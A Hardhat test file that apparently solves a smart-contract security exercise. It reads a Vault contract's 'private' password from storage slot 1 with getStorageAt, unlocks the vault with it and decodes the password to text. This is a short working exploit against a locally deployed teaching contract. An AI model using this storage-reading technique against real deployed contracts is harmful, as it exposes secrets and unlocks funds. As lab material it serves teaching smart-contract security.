import { expect } from "chai";
import { ethers, waffle } from "hardhat";
import helper from "./VaultHelper";

let victim: any;

describe("Attacking Vault", function () {
  beforeEach(async () => {
    const Victim = await ethers.getContractFactory("Vault");
    victim = await Victim.deploy(
      ethers.utils.formatBytes32String("A very strong password")
    );
  });

  const hex2a = (hexx: string) => {
    const hex = hexx.toString();
    let str = "";
    for (var i = 0; i < hex.length; i += 2) {
      const char = String.fromCharCode(parseInt(hex.substr(i, 2), 16));
      if (char !== "\x00") {
        str += char;
      }
    }

    return str;
  };

  // Get this to pass!
  it("Succesfully unlock the vault", async () => {
    const address = victim.address;
    await helper(victim);

    // victim stores private info in contract. bad idea per this reference: https://solidity-by-example.org/hacks/accessing-private-data
    const slot1 = await ethers.provider.getStorageAt(address, 1);

    await victim.unlock(slot1);

    const passwordStr = hex2a(slot1); // just for fun :-)
    console.log("resp ==>", passwordStr);

    const locked = await victim.locked();
    expect(locked).to.be.equal(false);
  });
});
